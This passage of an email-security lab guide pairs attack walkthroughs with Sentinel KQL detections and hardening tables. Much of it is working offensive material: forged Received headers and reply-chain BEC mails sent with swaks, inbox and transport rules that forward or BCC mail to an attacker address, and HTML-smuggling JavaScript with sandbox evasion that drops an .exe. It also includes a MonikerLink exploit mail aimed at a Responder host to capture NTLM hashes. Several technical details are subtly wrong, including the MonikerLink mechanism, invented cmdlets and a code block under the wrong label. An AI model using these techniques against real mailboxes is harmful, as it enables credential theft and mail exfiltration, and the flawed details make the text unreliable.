The cycle takes days to weeks. Modern ESPs have anti-abuse systems that flag new-account + high-volume + low-engagement patterns quickly, but the cat-and-mouse is constant.

### Dedicated-IP Warm-up Arithmetic

A defender needs to understand the warm-up arithmetic to recognize when their legitimate ESP traffic is being throttled. The standard warm-up curve:

```text
Day  1:   50/day    (probe for bounce rate)
Day  2:   100/day
Day  3:   500/day
Day  4:   1,000/day
Day  5:   2,000/day
Day  6:   5,000/day
Day  7:   10,000/day
Day 14:   50,000/day
Day 21:   200,000/day  (full send)
```

The metric that matters is **bounce rate** and **complaint rate**:

- Bounce rate > 5% → reputation damaged; expect throttling
- Complaint rate (marked-as-spam) > 0.1% → reputation severely damaged; expect suspension

### ESP Reputation Lab Exercise (Using the ESP Simulator)

Use the `esp-sim` container from the lab setup to demonstrate reputation decay:

```bash
# Day 1 of warm-up — small volume, all valid recipients
for i in $(seq 1 50); do
  curl -s http://localhost:8081/v3/mail/send \
    -H "Authorization: Bearer REPLACE_WITH_YOUR_ESP_SIM_KEY" \
    -H "Content-Type: application/json" \
    -d "{
      \"personalizations\":[{\"to\":[{\"email\":\"victim$i@<phish-domain>\"}]}],
      \"from\":{\"email\":\"sender@<phish-domain>\"},
      \"subject\":\"day1-$i\",
      \"content\":[{\"type\":\"text/plain\",\"value\":\"warm-up probe $i\"}]
    }" > /dev/null
done

# Check reputation DB
sqlite3 /opt/email-evasion-lab/esp-sim-data/reputation.sqlite \
  "select * from reputation"
# Expected: 50 delivered, 0 bounced, 0 complained, 0 trap
# Score: 100

# Now simulate a bad sender — 10% bounce rate
for i in $(seq 1 100); do
  # 10% of recipients are invalid (will "bounce" in real ESP)
  recipient="victim-$i@<phish-domain>"
  if [ $((i % 10)) -eq 0 ]; then
    recipient="invalid-$i@nowhere.invalid"
  fi
  curl -s http://localhost:8081/v3/mail/send \
    -H "Authorization: Bearer REPLACE_WITH_YOUR_ESP_SIM_KEY" \
    -H "Content-Type: application/json" \
    -d "{
      \"personalizations\":[{\"to\":[{\"email\":\"$recipient\"}]}],
      \"from\":{\"email\":\"sender@<phish-domain>\"},
      \"subject\":\"bounce-test-$i\",
      \"content\":[{\"type\":\"text/plain\",\"value\":\"bounce test $i\"}]
    }" > /dev/null
done

# Check reputation DB again
sqlite3 /opt/email-evasion-lab/esp-sim-data/reputation.sqlite \
  "select * from reputation"
# Expected: bounce_rate ~10%; score should drop to 10 (rejected)
```

### Defender Side: ESP Audit Checklist

When auditing a client's ESP usage (defender perspective):

```text
[ ] ESP account enforces MFA on the web UI (SendGrid/Mailgun/SES console)
[ ] API keys are scoped (restricted permissions; not "full access")
[ ] API keys are rotated at least quarterly
[ ] Sending domains are DKIM-signed by the ESP and DMARC-aligned with the
    organizational domain (use SendGrid's "authenticated" sending, not
    "unauthenticated")
[ ] Dedicated IPs are warmed up per the curve above
[ ] Bounce handling is automatic (unsubscribe on hard bounce)
[ ] Complaint rate (Feedback Loop / FBL) is monitored; threshold alert at 0.1%
[ ] Suppression list is maintained and respected
[ ] Sub-account separation by sender type (marketing vs. transactional vs. test)
[ ] Webhook for ESP events forwarded to SIEM for anomaly detection
[ ] DMARC rua reports from the ESP domain are reviewed
```

### Detecting ESP Abuse

For a defender, signs that an ESP account is being abused (or that an attacker is using the same ESP):

```kql
// Detect a sudden volume spike from a single ESP sender
let baseline = 7d;
EmailEvents
| where TimeGenerated > ago(baseline)
| where SenderFromDomain in ("<phish-domain>", "sendgrid.net", "mailgun.info")
| summarize daily_count = count() by bin(TimeGenerated, 1d), SenderFromDomain
| order by SenderFromDomain, TimeGenerated
// Look for daily_count that is 10x baseline on any given day
```

```kql
// Detect a single SendGrid/Mailgun customer sending the same subject to many recipients
EmailEvents
| where SenderFromDomain has "sendgrid.net"
| summarize recipients = makeset(RecipientEmailAddress) by Subject, bin(TimeGenerated, 1h)
| where array_length(recipients) > 50
| project TimeGenerated, Subject, recipients
```

---

## AiTM Refinements — Combining with `email-protocol-attack`

The deep-dive lab covers AiTM fundamentals (evilginx2 + gophish). This section covers AiTM refinements that draw on protocol-level primitives from `email-protocol-attack`.

### Multi-Hop MX Pre-Routing for Attribution Obfuscation

A basic AiTM lure URL (`https://login.<phish-domain>/reset`) is easily attributed: one domain, one IP. To make attribution harder (in an authorized engagement where attribution resistance is in scope), the lure can route through multiple MX hops that each forward to the next.

```text
victim clicks URL
       |
       v
   hop 1: redirect.<legit-lookalike>.net  (Cloudflare, fastly, or CDN-cached 302)
       |
       v
   hop 2: mail.<second-lookalike>.com     (a postfix relay you control)
       |
       v
   hop 3: login.<phish-domain>             (evilginx2 AiTM)
```

Each hop rewrites the URL and logs only the immediately-prior hop. Attribution requires correlating logs across three hops and the CDN, which is feasible for law enforcement but slows down incident response.

```nginx
# Hop 1 (CDN-cached 302 — Cloudflare Workers or Fastly Compute@Edge)
addEventListener('fetch', e => {
  const target = 'https://mail.<second-lookalike>.com/r/' +
                 btoa(e.request.url).replace(/=/g, '');
  e.respondWith(Response.redirect(target, 302));
});

# Hop 2 (postfix + nginx) — logs the prior hop's URL, 302s to hop 3
# /etc/nginx/sites-available/hop2
server {
  listen 443 ssl http2;
  server_name mail.<second-lookalike>.com;
  location ~ ^/r/(.+)$ {
    # Decode the original URL (optional — only for telemetry)
    # 302 to hop 3
    return 302 https://login.<phish-domain>/reset?id=$1;
  }
}
```

### AiTM + Custom Received-Chain

A more advanced refinement: instead of relaying the lure URL through hops, the attacker forges a `Received:` chain on the lure mail to make the campaign mail look like it transited through a legitimate corporate relay. This does not affect delivery (the receiving gateway still runs SPF/DKIM/DMARC against the real connecting IP), but it can confuse forensic analysts who read the chain post-incident.

```bash
# Build a forged Received chain and inject via swaks custom headers
swaks --to victim@<target.com> \
      --from it-alerts@<look-alike-domain> \
      --server mail.<target.com>:25 \
      --header "Received: from internal-relay.<target.com> ([10.10.1.5]) by smtp-in.<target.com> with ESMTP id FORGED-001; Fri, 27 Jun 2026 14:00:00 +0000" \
      --header "Received: from mail.<look-alike-domain> ([198.51.100.10]) by internal-relay.<target.com> with ESMTP id FORGED-000; Fri, 27 Jun 2026 14:00:01 +0000" \
      --header "X-MS-Exchange-Organization-AuthAs: Internal" \
      --header "Subject: IT alert — verify MFA"
```

The defender's mitigation: the bottom-most `Received:` header from the receiving gateway is authoritative; anything above it is hop-attestable but should not be trusted for routing/identity decisions.

### Reply-Chain Injection

Most enterprise BEC attacks succeed by replying to an existing thread rather than starting a new one. The attacker either:

1. Compromises a mailbox and replies from inside
2. Spoofs the `In-Reply-To` and `References` headers to make a new mail appear as a reply

```bash
# Forge a reply to a real thread (the thread's Message-ID must be known)
swaks --to victim@<target.com> \
      --from vendor@<look-alike-domain> \
      --server mail.<target.com>:25 \
      --header "Subject: Re: Q3 invoice — please confirm" \
      --header "In-Reply-To: <original-message-id@target.com>" \
      --header "References: <original-message-id@target.com>" \
      --body "Hi, following up — can you confirm the bank details? Click here: https://lookup.<phish-domain>/confirm"
```

Defender detection: a `Re:` mail whose `In-Reply-To` references a thread the recipient never participated in is highly suspicious. Correlate the referenced Message-ID against the recipient's mailbox.

---

## Mailbox Takeover Post-Exploitation

Once an AiTM-captured session replays successfully (from the deep-dive lab), the attacker's next step is persistence. Mailbox takeover persistence has four main primitives:

1. **Outlook Rules** (client-side)
2. **Mail-Flow (transport) Rules** (server-side, Exchange admin)
3. **OAuth grants** (consent phishing)
4. **Inbox-Rule persistence via Graph API** (modern cloud)

This chapter covers each from both offensive (emulation) and defensive (detection) perspectives.

### Outlook Rules (Client-Side)

Outlook Rules are .NET-style rules stored in the user's mailbox and executed by the Outlook client (not the server). They trigger on mail receipt and can: move mail to a folder, mark as read, forward to an external address, delete, etc.

The classic attacker pattern: create a rule that watches for words like "invoice", "wire", "password" in the subject, and forwards matching mails to an attacker-controlled address.

```powershell
# Connect to the victim's mailbox via Graph API (after session replay)
# In the lab: connect to your M365 dev tenant admin
Connect-MgGraph -Scopes "Mail.ReadWrite","MailboxSettings.ReadWrite"

# List existing rules
Get-MgUserMessageRule -UserId <victim-upn>

# Create a sneaky forwarding rule
New-MgUserMessageRule -UserId <victim-upn> -DisplayName "vendor invoicing" `
  -Sequence 1 `
  -IsEnabled `
  -Conditions @{
    SubjectContains = @("invoice", "wire", "payment")
  } `
  -Actions @{
    ForwardTo = @(@{ EmailAddress = @{ Address = "attacker@<look-alike-domain>" } })
    MarkAsRead = $true
    MoveToFolder = "Archive"
  }
```

Detection:

```powershell
# Find all forwarding rules in the tenant
Get-MgUser -All | ForEach-Object {
  Get-MgUserMessageRule -UserId $_.Id -ErrorAction SilentlyContinue |
    Where-Object { $_.Actions.ForwardTo -or $_.Actions.RedirectTo -or $_.Actions.ForwardAsAttachmentTo } |
    Select-Object @{n="User";e={$_.UserId}}, DisplayName, @{n="ForwardTo";e={$_.Actions.ForwardTo}}
}
```

Defender detection rule (Microsoft Sentinel KQL):

```kql
// Detect Outlook rules that forward to external addresses
OfficeActivity
| where Operation == "New-InboxRule"
| extend RuleText = tostring(extractjson("$.Parameters", Parameters))
| where RuleText has "ForwardTo" or RuleText has "RedirectTo"
| where RuleText has any ("<look-alike-domain>", "gmail.com", "yahoo.com", "protonmail.com")
| project TimeGenerated, UserId, RuleText
```

### Mail-Flow (Transport) Rules — Server-Side

Mail-Flow Rules (Exchange admin) execute at the server, not the client. They require Exchange admin privilege. Attackers who gain Exchange admin (via AiTM-captured admin session or by abusing `Mailbox Import Export` role) can create server-side rules that:

- BCC all mails to an external address
- Auto-forward mails matching a pattern
- Modify subjects or redirect

```powershell
# Connect to Exchange Online PowerShell (after gaining Exchange admin)
Connect-ExchangeOnline

# List transport rules
Get-TransportRule

# Create a BCC rule
New-TransportRule -Name "audit-archive" `
  -FromScope "InOrganization" `
  -BlindCopyTo "attacker@<look-alike-domain>" `
  -Priority 0 `
  -Comments "compliance archive"
```

Detection:

```powershell
# Find all transport rules that BCC or forward externally
Get-TransportRule | Where-Object {
  $_.BlindCopyTo -or $_.RedirectMessageTo -or $_.AddToRecipients
} | Format-Table Name, BlindCopyTo, RedirectMessageTo, AddToRecipients
```

Defender detection rule (Sentinel):

```kql
// Detect new transport rules that add an external BCC
OfficeActivity
| where Operation == "New-TransportRule"
| extend RuleText = tostring(extractjson("$.Parameters", Parameters))
| where RuleText has "BlindCopyTo" or RuleText has "RedirectMessageTo"
| project TimeGenerated, UserId, RuleText
```

### OAuth Grants (Consent Phishing)

OAuth grants are application-level permissions to a user's data. The user consents once; the application can then access their mailbox, files, calendar, etc. without further prompts. Attackers register malicious Azure AD apps and trick users into consenting.

The flow:

1. Attacker registers an Azure AD app with `Mail.Read` scope
2. Attacker crafts a consent URL: `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<app-id>&response_type=code&redirect_uri=<attacker>&scope=Mail.Read offline_access`
3. Victim clicks the URL, sees Microsoft's consent prompt, clicks "Accept"
4. Attacker receives an authorization code, exchanges for access + refresh tokens
5. Attacker now has persistent API access to the victim's mailbox until the grant is revoked

OAuth consent phishing **bypasses MFA** because the user consents interactively, and **bypasses AiTM** because no session cookie is captured — the attacker has their own token.

```powershell
# Defender: find all OAuth grants in the tenant
Connect-MgGraph -Scopes "Directory.Read.All","AppRoleAssignment.ReadWrite.All"

# List all user-consented app grants
Get-MgServicePrincipal -All | ForEach-Object {
  $sp = $_
  Get-MgServicePrincipalOauth2PermissionGrant -ServicePrincipalId $sp.Id |
    Select-Object @{n="App";e={$sp.DisplayName}},
                  @{n="User";e={$_.PrincipalId}},
                  @{n="Scope";e={$_.Scope}}
} | Where-Object { $_.Scope -match "Mail\.|Files\.|Calendars\." }
```

Defender detection rule (Sentinel):

```kql
// Detect OAuth grants to applications with high-privilege scopes
AuditLogs
| where OperationName == "Consent to application"
| extend ConsentContext = tostring(parse_json(TargetResources)[0].modifiedProperties)
| where ConsentContext has_any ("Mail.Read", "Mail.ReadWrite", "Files.Read", "Files.ReadWrite", "Calendars.ReadWrite")
| where ConsentContext has "ConsentType=User"
| project TimeGenerated, InitiatingUserPrincipalName, ConsentContext
```

Mitigation: configure the **consent policy** to require admin consent for high-privilege scopes.

```powershell
# Restrict user consent to low-risk scopes only (verified publisher, single tenant)
# This is the Microsoft-recommended setting
Update-MgPolicyAdminConsentRequestPolicy -BodyParameter @{
  IsEnabled = $true
  NotifyReviewers = $true
}
```

### Inbox-Rule Persistence via Graph API

Modern attackers prefer Graph API calls (rather than Outlook Rules) because:

- No client-side component (works on any mailbox, including users who never open Outlook)
- Bypasses some DLP rules that target "client rule creation"
- Less logged than Outlook Rule creation

```powershell
# Using the AiTM-captured session, call the Graph API directly
$session = "<captured-access-token>"
$ victim_upn = "user_totp@<target>.onmicrosoft.com"

# Create an inbox rule via Graph API
Invoke-RestMethod -Method Post `
  -Uri "https://graph.microsoft.com/v1.0/users/$victim_upn/mailFolders/inbox/messageRules" `
  -Headers @{ Authorization = "Bearer $session" } `
  -ContentType "application/json" `
  -Body (@{
    displayName = "Vendor Invoices"
    sequence = 1
    isEnabled = $true
    conditions = @{ subjectContains = @("invoice", "wire") }
    actions = @{
      forwardTo = @(@{ emailAddress = @{ address = "attacker@<look-alike-domain>" } })
      markAsRead = $true
    }
  } | ConvertTo-Json -Depth 5)
```

Defender detection: the `New-InboxRule` operation in Exchange Online audit logs catches both Outlook-rule and Graph-API rule creation uniformly.

### Persistence Takeover Decision Matrix

| Primitive | Requires | Stealth | Persistence (if not detected) | Defender Detection |
|-----------|----------|--------|-------------------------------|--------------------|
| Outlook Rule | Mailbox access | Low — visible in Outlook UI | Until rule deleted | `New-InboxRule` audit event |
| Mail-Flow Rule | Exchange admin | Medium — only in EAC | Until rule deleted | `New-TransportRule` audit event |
| OAuth grant | User click on consent URL | High — no Outlook footprint | Until admin revokes grant | `Consent to application` audit event |
| Graph API rule | Mailbox access token | Medium — invisible in Outlook UI | Until rule deleted | `New-InboxRule` audit event (unified) |

---

## Modern Attachment Techniques

This chapter covers the modern attachment primitives that bypass gateway sandboxes. The siblings guides cover HTML smuggling at a payload level; this chapter covers the underlying mechanisms and walks through CVE-2024-21413 (MonikerLink).

### HTML Smuggling Internals

HTML smuggling reconstructs a malicious binary client-side, inside the victim's browser, after the mail is delivered. The gateway sees only HTML and JavaScript — never the binary itself.

```html
<!-- smuggled.html — embedded as an attachment in the campaign mail -->
<!DOCTYPE html>
<html>
<head><title>Invoice</title></head>
<body>
<h1>Invoice 2026-Q2</h1>
<p>Please review the attached invoice.</p>
<script>
// Base64-encoded payload (in a real engagement: a benign beacon for the lab)
// In a lab: replace with a harmless binary like a small text file
const payload_b64 = "REPLACE_WITH_BASE64_OF_LAB_PAYLOAD";
const payload_bytes = atob(payload_b64).split('').map(c => c.charCodeAt(0));

// Wrap in a Blob and trigger a download
const blob = new Blob([new Uint8Array(payload_bytes)], { type: 'application/octet-stream' });
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = 'invoice.pdf.exe';   // or "invoice.pdf.jar" / ".iso" / etc.
document.body.appendChild(a);
a.click();
</script>
</body>
</html>
```

The gateway sees an HTML file containing base64-encoded data and JavaScript. Sandboxes that detonate HTML/JS in a headless browser may or may not trigger the download — many don't because there's no user gesture. The binary is reconstructed only when the victim opens the attachment in their real browser.

#### Sandbox-Evasion Refinement

Some sandboxes *do* render the HTML in a headless browser. To evade:

```javascript
// Only trigger if there's been a user gesture (mouse movement, key press)
let user_interacted = false;
document.addEventListener('mousemove', () => { user_interacted = true; });
document.addEventListener('keydown',   () => { user_interacted = true; });

function maybe_smuggle() {
  if (!user_interacted) {
    setTimeout(maybe_smuggle, 500);
    return;
  }
  // ... actual smuggling logic
}
maybe_smuggle();
```

Sandboxes typically do not move the mouse; victim browsers do.

### MHTML Abuse

MHTML (MIME HTML) is an old format (RFC 2557) that bundles HTML and its resources into a single file. Some sandboxes do not parse MHTML, treating it as inert text. Outlook and Internet Explorer/Edge legacy can render MHTML directly.

The lab exercise: build an MHTML file that, when opened in Outlook, fetches a remote resource.

```bash
# Build a simple MHTML that fetches an external tracking pixel
# (no payload — just demonstrates the fetch path)
cat > /tmp/lab.mhtml <<'EOF'
From: <sender>
Subject: lab
Date: Fri, 27 Jun 2026 14:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/related; type="text/html";
  boundary="----=_MIME_BOUNDARY_"

------=_MIME_BOUNDARY_
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: 7bit

<html><body>
<img src="https://tracking.<phish-domain>/pixel.png?id=mhtml-lab">
</body></html>

------=_MIME_BOUNDARY_--
EOF

# Send via swaks
swaks --to victim@<target.com> \
      --from sender@<look-alike-domain> \
      --attach - < /tmp/lab.mhtml \
      --header "Subject: lab MHTML"
```

Defender detection: any mail with `Content-Type: multipart/related; type="text/html"` and `.mhtml` attachment is suspicious. Block at the gateway.

### RTF `objupdate` Linkage

RTF supports OLE object linkage via the `objupdate` keyword. When Outlook renders an RTF attachment that contains an `objupdate` linkage to a remote SMB/WebDAV server, the Outlook client fetches the remote resource — leaking the victim's NTLM hash if the resource is on an attacker-controlled SMB share.

```text
# Excerpt of a malicious RTF demonstrating objupdate linkage
# (do not deploy — lab demonstration only)
{\object\objupdate{\objclass Word.Document.8\objdata
  0105000200000000000000000000000000000000...
  }}
```

This is the same primitive as CVE-2017-0199 (Microsoft Office/WordPad Remote Code Execution). Modern Outlook versions patch the automatic fetch, but the technique still works against unpatched or legacy clients.

Defender detection: any RTF attachment containing `objupdate` is suspicious. Block at the gateway. Defender for Office's Common Attachments Filter flags RTF.

### CVE-2024-21413 (MonikerLink) Walk-Through

CVE-2024-21413 ("MonikerLink") is a 9.8 CVSS RCE in Microsoft Outlook disclosed February 13, 2024. The vulnerability is in how Outlook handles `mailto:`-style URLs that include a special "moniker" prefix — specifically, URLs of the form:

```text
file://<attacker-smb-server>/share/file
```

When the victim opens (in some cases, merely previews) such a mail, Outlook attempts to fetch the file via the MAPI HTTP protocol. The fetch leaks the victim's NTLM hash to the attacker's server, allowing pass-the-hash or NTLM relay.

#### MonikerLink Mail Structure

```text
From: attacker@<look-alike-domain>
To: victim@<target.com>
Subject: shared document
MIME-Version: 1.0
Content-Type: text/html

<html><body>
<a href="file://<attacker-smb-server>/share/file.docx!monikerlink">click to view document</a>
</body></html>
```

The `!monikerlink` suffix on the URL is the trigger. Outlook parses it as a MAPI moniker reference and fetches the file.

#### Lab Reproduction (Defender Side)

In an authorized lab (with a patched Outlook to demonstrate detection, or an unpatched VM to demonstrate impact):

```bash
# Step 1: Stand up an SMB capture server (Responder) on <vps_ip>
sudo responder -I eth0 -rdwf

# Step 2: Build the MonikerLink mail
cat > /tmp/moniker.eml <<EOF
From: sender@<look-alike-domain>
To: victim@<target.com>
Subject: shared document
MIME-Version: 1.0
Content-Type: text/html

<html><body>
<a href="file://<vps_ip>/share/document.docx!monikerlink">Open document</a>
</body></html>
EOF

# Step 3: Send via swaks
swaks --to victim@<target.com> \
      --from sender@<look-alike-domain> \
      --server mail.<target.com>:25 \
      --data /tmp/moniker.eml

# Step 4: On an unpatched Outlook client, victim previews the mail
# Responder logs the victim's NTLMv2 hash:
#   [SMB] NTLMv2-SSP Client   : <victim-ip>
#   [SMB] NTLMv2-SSP Username : TARGET\victim
#   [SMB] NTLMv2-SSP Hash     : victim::TARGET:...:...
```

#### Defender Detection

```kql
// Detect mails containing MonikerLink URLs (CVE-2024-21413)
EmailEvents
| where TimeGenerated > ago(7d)
| where EmailDirection == "Inbound"
| where Subject has "monikerlink" or BodyHasFlags has "monikerlink"
   or (Subject matches regex "(?i)file://[^\\s]+!monikerlink"
       or BodyHasFlags matches regex "(?i)file://[^\\s]+!monikerlink")
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject
```

```kql
// Detect NTLM hash leak (Responder-style capture): outbound SMB from a client
// to an internet-facing host on port 445
DeviceNetworkEvents
| where TimeGenerated > ago(7d)
| where RemotePort == 445
| where RemoteIPType == "Public"
| where InitiatingProcessFileName in~ ("outlook.exe", "winword.exe", "excel.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, RemoteIP
```

#### Mitigation

- **Patch Outlook** (the February 2024 Patch Tuesday fixes CVE-2024-21413)
- **Block outbound SMB** (port 445) at the perimeter
- **Disable NTLM** where possible; use Kerberos
- **Enable Microsoft Defender for Office "External Tagging"** so users see an explicit warning on external mail
- **Block `file://` URLs** in mail bodies at the gateway

---

## Lab Exercises (Self-Assessment)

### Exercise 1: Gateway Identification

Send a probe mail to a target mailbox you control. From the received headers, identify:

1. Which gateway is in use (Proofpoint / Mimecast / Cisco ESA / Defender)
2. The spam score (SCL for Defender, Spam-Details for Proofpoint)
3. Whether DMARC passed, failed, or was not enforced

**Pass criteria**: A one-page report identifying the gateway and the DMARC state with evidence from the headers.

### Exercise 2: ARC Chain Forensic Reconstruction

Take a saved `.eml` of a mail that was forwarded through a mailing list. Run `received-parser.py` against it. Identify:

1. How many hops are in the ARC chain
2. Whether `cv=pass` on the outermost seal
3. Whether any hop stripped DKIM signatures (compare `ARC-Authentication-Results` at each hop)

**Pass criteria**: A two-paragraph analysis of the chain's integrity.

### Exercise 3: ESP Reputation Warm-Up

Using the `esp-sim` container:

1. Warm up a sender IP to 1000 sends/day with 0% bounce and 0% complaint
2. Verify the reputation score is 100
3. Trigger a 5% bounce rate (send to invalid recipients) and verify the score drops below 20

**Pass criteria**: Demonstrate the warm-up curve, the steady-state, and the reputation collapse in the SQLite DB.

### Exercise 4: Mailbox Takeover Detection

After running the deep-dive lab's session capture, use the captured session to:

1. Create an Outlook Rule that forwards "invoice"-subject mails to an external address
2. Use Graph API to create an equivalent rule
3. Verify that both appear in the Unified Audit Log as `New-InboxRule`
4. Author a Sentinel KQL rule that detects both

**Pass criteria**: Both rule creations fire the KQL detection within 5 minutes.

### Exercise 5: CVE-2024-21413 Detection

Stand up Responder on the lab VPS. Build and send a MonikerLink mail to a lab victim. Author a Sentinel KQL rule that:

1. Detects the inbound mail by pattern matching `monikerlink` in the subject/body
2. Detects the outbound SMB connection from Outlook to the attacker IP

**Pass criteria**: Both detections fire within 5 minutes of the victim previewing the mail.

---

## Detection & Mitigation (Defensive Perspective)

This chapter aggregates the defensive counter-controls for each offensive technique covered above.

### Gateway Hardening

| Control | What It Stops | Priority |
|---------|---------------|----------|
| Strict DMARC (`p=reject`) on all subdomains | Spoofing of organizational and subdomain identities | CRITICAL |
| ARC verification on inbound | Forged ARC chains from untrusted forwarders | HIGH |
| URL rewriting at click-time (Proofpoint URL Defense / Defender Safe Links) | Benign-at-delivery / malicious-at-click URLs | CRITICAL |
| Attachment sandboxing (Defender Safe Attachments / Cisco ESA) | Most attachment-borne payloads | CRITICAL |
| Block `file://` URLs in mail bodies | CVE-2024-21413 MonikerLink and similar | CRITICAL |
| Block encrypted archives by default | Encrypted-zip sandbox bypass | HIGH |
| Block `.iso`, `.img`, `.vhd`, `.mhtml`, `.rtf` attachments | File-type-allowlist abuse; MHTML/RTF abuse | HIGH |
| Sender reputation scoring (per-IP, per-domain, per-ESP) | New-IP reputation bypass via ESP abuse | HIGH |
| Common Attachments Filter (Defender) | Macro-based and embedded-object payloads | HIGH |
| Outbound SMB block (port 445) at perimeter | NTLM hash leak via file:// URLs and Responder | CRITICAL |

### Identity Hardening

| Control | What It Stops | Priority |
|---------|---------------|----------|
| FIDO2 / hardware security keys | AiTM (origin-bound assertion) | CRITICAL |
| Conditional Access — require compliant device | Session-cookie replay from non-managed device | CRITICAL |
| CAE (Continuous Access Evaluation) | Session survival after risk detected | HIGH |
| OAuth consent policy (admin consent for high-priv scopes) | Consent phishing | HIGH |
| Block legacy auth (IMAP/SMTP basic auth) | Bypass paths via legacy protocols | CRITICAL |
| Disable NTLM where possible; use Kerberos | NTLM relay and pass-the-hash | HIGH |

### Audit Logging

| Log Source | What It Catches |
|------------|-----------------|
| Exchange Online audit (`New-InboxRule`, `New-TransportRule`) | Outlook Rules, Mail-Flow Rules, Graph API rules |
| Azure AD audit (`Consent to application`) | OAuth consent phishing |
| Azure AD sign-in logs | AiTM sign-ins (impossible travel, new geo, new IP) |
| EmailEvents (Defender for Office) | Inbound mail with suspicious URLs/attachments |
| DeviceNetworkEvents (Defender for Endpoint) | Outbound SMB from Outlook/Office to internet |
| Gateway logs (Proofpoint/Mimecast/Cisco ESA) | Pre-Azure-AD layer — gateway quarantines and rewrites |

### Incident Response Checklist (Mailbox Takeover)

When investigating a confirmed mailbox compromise:

```text
[ ] Identify the entry vector (AiTM? OAuth consent? Credential leak?)
    - Azure AD sign-in logs: look for ClientAppUsed=Browser, unusual IP/geo
    - Azure AD audit logs: look for "Consent to application" events

[ ] Revoke active sessions:
    Revoke-MgUserAllSession -UserId <upn>

[ ] Reset credentials and require MFA re-registration
    (For FIDO2-protected users: confirm AiTM did not succeed before reset)

[ ] Find and delete attacker persistence:
    - Outlook Rules:   Get-MgUserMessageRule, remove any with forward/redirect
    - Mail-Flow Rules: Get-TransportRule, remove unauthorized
    - OAuth grants:    Get-MgServicePrincipalOauth2PermissionGrant, revoke malicious

[ ] Hunt for exfiltration:
    - Mail flow logs: any auto-forwards to external addresses in the compromise window?
    - File audit logs: any bulk download from OneDrive/SharePoint?

[ ] Quarantine the lure mail across the tenant:
    Get-MailDetail -StartDate ... | where Subject matches | Remove-Content

[ ] Communicate per IR plan (affected users, security leadership, legal)
[ ] Post-incident: roll out FIDO2 to remaining TOTP/push users;
    document control gaps
```

---

## Common Pitfalls

### Pitfall 1: Mis-Attributing a Gateway

**Symptom**: You assume Defender for Office is in place, but the headers actually show Mimecast.

**Cause**: Many large organizations use a "defense in depth" model with two gateways in series. The bottom-most gateway header is the innermost (closest to the mailbox); the top-most is the outermost.

**Fix**: Always read `Received:` chain from bottom-up. Identify the innermost gateway first (closest to the mailbox), then the outer ones. Each gateway's headers will be in a distinct cluster.

### Pitfall 2: Trusting Forged Received Headers

**Symptom**: A mail appears to come from an internal IP based on a `Received:` header, but the connecting IP at your gateway is external.

**Cause**: The attacker prepended a forged `Received:` header to make the mail look internal.

**Fix**: The bottom-most `Received:` header from your own gateway is authoritative. Any `Received:` header above it is hop-attestable but not hop-verifiable (unless ARC `cv=pass`).

### Pitfall 3: Confusing DKIM "Body Hash Mismatch" with Active Tampering

**Symptom**: A mail's DKIM signature fails with "bh mismatch", but the content looks legitimate.

**Cause**: A legitimate forwarder (mailing list, support system) added a footer or re-wrapped the body, breaking the body hash. This is not necessarily malicious.

**Fix**: Check the `ARC-Authentication-Results` at the first hop. If DKIM passed there, the failure is at a later hop due to legitimate forwarding. Investigate the forwarder's identity.

### Pitfall 4: Over-Mitigating OAuth Consent

**Symptom**: After restricting OAuth consent to admin-only, legitimate third-party apps (Salesforce, Zoom, etc.) stop working.

**Cause**: User-consented grants for legitimate apps were also blocked.

**Fix**: Pre-approve a list of trusted apps (Salesforce, Zoom, DocuSign, etc.) via Admin Consent Request Policy. Block consent for any app not on the pre-approved list.

### Pitfall 5: Misinterpreting `cv=none` in ARC

**Symptom**: You treat a `cv=none` ARC seal as suspicious.

**Cause**: `cv=none` is the correct value for the first hop in any chain (the originator). It is not a defect.

**Fix**: `cv=none` is normal at `i=1`. Suspicious values are `cv=fail` at any `i>1`, or a chain where the outermost `cv=` is not `pass`.

### Pitfall 6: Burning an ESP Account in Lab

**Symptom**: Your real SendGrid/Mailgun/SES account gets suspended after a lab exercise.

**Cause**: You ran the reputation-decay lab against a real ESP instead of the `esp-sim` container.

**Fix**: Always use the `esp-sim` container for reputation-decay exercises. Real ESP accounts are for authorized engagements only, and reputation damage takes weeks to recover.

---

## References and Further Reading

- **RFC 5321 (SMTP)**: [datatracker.ietf.org/doc/html/rfc5321](https://datatracker.ietf.org/doc/html/rfc5321) — base protocol
- **RFC 5322 (Mail Format)**: [datatracker.ietf.org/doc/html/rfc5322](https://datatracker.ietf.org/doc/html/rfc5322) — headers including `Received:`
- **RFC 7208 (SPF)**: [datatracker.ietf.org/doc/html/rfc7208](https://datatracker.ietf.org/doc/html/rfc7208)
- **RFC 6376 (DKIM)**: [datatracker.ietf.org/doc/html/rfc6376](https://datatracker.ietf.org/doc/html/rfc6376)
- **RFC 7489 (DMARC)**: [datatracker.ietf.org/doc/html/rfc7489](https://datatracker.ietf.org/doc/html/rfc7489)
- **RFC 8617 (ARC)**: [datatracker.ietf.org/doc/html/rfc8617](https://datatracker.ietf.org/doc/html/rfc8617)
- **CVE-2024-21413 (MonikerLink)**: [nvd.nist.gov/vuln/detail/CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413) — NVD entry
- **MonikerLink analysis (Intel 471)**: [intel471.com/blog/monikerlink-outlooks-achilles-heel-navigating-the-perilous-waters-of-cve-2024-21413](https://www.intel471.com/blog/monikerlink-outlooks-achilles-heel-navigating-the-perilous-waters-of-cve-2024-21413)
- **MonikerLink analysis (Broadcom/Symantec)**: [broadcom.com/support/security-center/protection-bulletin/monikerlink-vulnerability-in-ms-outlook-cve-2024-21413](https://www.broadcom.com/support/security-center/protection-bulletin/monikerlink-vulnerability-in-ms-outlook-cve-2024-21413)
- **CVE-2017-0199 (RTF objupdate precursor)**: [learn.microsoft.com/security-updates/SecurityBulletins/2017/ms17-088](https://learn.microsoft.com/en-us/security-updates/) — historical context for OLE linkage abuse
- **Proofpoint AiTM research**: [proofpoint.com/us/blog/email-and-cloud-threats/aitm-phishing-attacks-evolving-threat-microsoft-365](https://www.proofpoint.com/us/blog/email-and-cloud-threats/aitm-phishing-attacks-evolving-threat-microsoft-365)
